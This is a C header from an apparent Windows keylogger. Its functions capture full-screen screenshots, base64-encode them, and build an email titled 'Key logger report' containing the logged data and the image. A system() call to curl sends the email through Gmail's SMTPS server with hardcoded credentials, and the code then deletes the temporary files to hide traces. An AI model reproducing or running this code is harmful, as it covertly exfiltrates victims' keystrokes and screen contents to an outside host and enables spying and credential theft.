#include <wingdi.h>
#include "base64Encoder.h"
#ifndef EMAILSENDER_H_INCLUDED
#define EMAILSENDER_H_INCLUDED

#define FROM "Joe <joe@gmail.com>"
#define TO "Joe <joe@gmail.com>"

const char curlCommand[] = ".\\curl -k --ssl-reqd --url \"smtps://smtp.gmail.com:465\" --user \"joe@gmail.com:password\" --mail-from \"joe@gmail.com\" --mail-rcpt \"joe@gmail.com\" --upload-file email.txt";

int createEmailFile(char *);
void deleteFiles();
int sendEmail(char *);
int saveScreenShot(HBITMAP hbCapture, LPCTSTR fileName);
int takeScreenShot();

int takeScreenShot() {
    int screenHeight = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int screenWidth = GetSystemMetrics(SM_CXVIRTUALSCREEN);

    HDC hdc = GetDC(NULL);              // get a desktop device context
    HDC hDest = CreateCompatibleDC(hdc); // create a dc to use for capture

    HBITMAP hbCapture = CreateCompatibleBitmap(hdc, screenWidth, screenHeight);
    SelectObject(hDest, hbCapture);

    // the following line effectively copies the screen into the capture bitamp
    BitBlt(hDest, 0,0, screenWidth, screenHeight, hdc, 0, 0, SRCCOPY);

    // clean up - release unused resources!
    ReleaseDC(NULL, hdc);
    DeleteDC(hDest);

    return saveScreenShot(hbCapture, "screenShot.bmp");
}

int saveScreenShot(HBITMAP hbCapture, LPCTSTR fileName){
      HDC hDC;
      int iBits;
      WORD wBitCount;
      DWORD dwPaletteSize=0, dwBmBitsSize=0, dwDIBSize=0, dwWritten=0;
      BITMAP Bitmap0;
      BITMAPFILEHEADER bmfHdr;
      BITMAPINFOHEADER bi;
      LPBITMAPINFOHEADER lpbi;
      HANDLE fh, hDib, hPal,hOldPal2=NULL;
      hDC = CreateDC("DISPLAY", NULL, NULL, NULL);
      iBits = GetDeviceCaps(hDC, BITSPIXEL) * GetDeviceCaps(hDC, PLANES);
      DeleteDC(hDC);
      if (iBits <= 1)
        wBitCount = 1;
      else if (iBits <= 4)
        wBitCount = 4;
      else if (iBits <= 8)
        wBitCount = 8;
      else
        wBitCount = 24;
      GetObject(hbCapture, sizeof(Bitmap0), (LPSTR)&Bitmap0);
      bi.biSize = sizeof(BITMAPINFOHEADER);
      bi.biWidth = Bitmap0.bmWidth;
      bi.biHeight =-Bitmap0.bmHeight;
      bi.biPlanes = 1;
      bi.biBitCount = wBitCount;
      bi.biCompression = BI_RGB;
      bi.biSizeImage = 0;
      bi.biXPelsPerMeter = 0;
      bi.biYPelsPerMeter = 0;
      bi.biClrImportant = 0;
      bi.biClrUsed = 256;
      dwBmBitsSize = ((Bitmap0.bmWidth * wBitCount +31) & ~31) /8
                                                    * Bitmap0.bmHeight;
      hDib = GlobalAlloc(GHND,dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER));
      lpbi = (LPBITMAPINFOHEADER)GlobalLock(hDib);
      *lpbi = bi;

      hPal = GetStockObject(DEFAULT_PALETTE);
      if (hPal)
      {
        hDC = GetDC(NULL);
        hOldPal2 = SelectPalette(hDC, (HPALETTE)hPal, FALSE);
        RealizePalette(hDC);
      }


      GetDIBits(hDC, hbCapture, 0, (UINT) Bitmap0.bmHeight, (LPSTR)lpbi + sizeof(BITMAPINFOHEADER)
        +dwPaletteSize, (BITMAPINFO *)lpbi, DIB_RGB_COLORS);

      if (hOldPal2)
      {
        SelectPalette(hDC, (HPALETTE)hOldPal2, TRUE);
        RealizePalette(hDC);
        ReleaseDC(NULL, hDC);
      }

      fh = CreateFile(fileName, GENERIC_WRITE,0, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);

      if (fh == INVALID_HANDLE_VALUE)
        return -1;

      bmfHdr.bfType = 0x4D42; // "BM"
      dwDIBSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize + dwBmBitsSize;
      bmfHdr.bfSize = dwDIBSize;
      bmfHdr.bfReserved1 = 0;
      bmfHdr.bfReserved2 = 0;
      bmfHdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + dwPaletteSize;

      WriteFile(fh, (LPSTR)&bmfHdr, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);

      WriteFile(fh, (LPSTR)lpbi, dwDIBSize, &dwWritten, NULL);
      GlobalUnlock(hDib);
      GlobalFree(hDib);
      CloseHandle(fh);
      return 1;
}

int createEmailFile(char *data){
    takeScreenShot();
    char *imageFileString = 0;
    char *imageBase64 = 0;
    FILE *imageFile = fopen("screenShot.bmp", "rb");
    if(imageFile){
        long length;
        fseek(imageFile, 0, SEEK_END);
        length = ftell(imageFile);
        fseek(imageFile, 0, SEEK_SET);
        imageFileString = malloc(length);
        fread(imageFileString, 1, length, imageFile);
        fclose(imageFile);
        imageBase64 = base64_encode(imageFileString, length);
    }

    FILE *fp = fopen("email.txt", "ab+");
    if(fp == NULL){
        return -1;
    }
    fprintf(fp, "MIME-Version: 1.0\nSubject: Key logger report\nFrom: %s\nTo: %s\nContent-Type: multipart/mixed; boundary=\"000000000000ad833405ca5415da\"\n\n--000000000000ad833405ca5415da\nContent-Type: multipart/alternative; boundary=\"000000000000ad833205ca5415d8\"\n\n--000000000000ad833205ca5415d8\nContent-Type: text/plain; charset=\"UTF-8\"\n\n%s\n\n--000000000000ad833205ca5415d8\nContent-Type: text/html; charset=\"UTF-8\"\nContent-Transfer-Encoding: quoted-printable\n\n<div dir=3D\"ltr\">%s</div>\n\n--000000000000ad833205ca5415d8--\n--000000000000ad833405ca5415da\nContent-Type: image/bmp; name=\"screenShot.bmp\"\nContent-Disposition: attachment; filename=\"screenShot.bmp\"\nContent-Transfer-Encoding: base64\nX-Attachment-Id: f_ksqj342c0\nContent-ID: <f_ksqj342c0>\n\n%s\n--000000000000ad833405ca5415da--\n", FROM, TO, data, data, imageBase64);
    fclose(fp);
    return 1;
}

void deleteFiles(){
    remove("email.txt");
    remove("screenShot.bmp");
}

int sendEmail(char *data){
    if(createEmailFile(data) < 0){
        return -1;
    }
    system(curlCommand);

    deleteFiles();
    return 0;
}

#endif // EMAILSENDER_H_INCLUDED
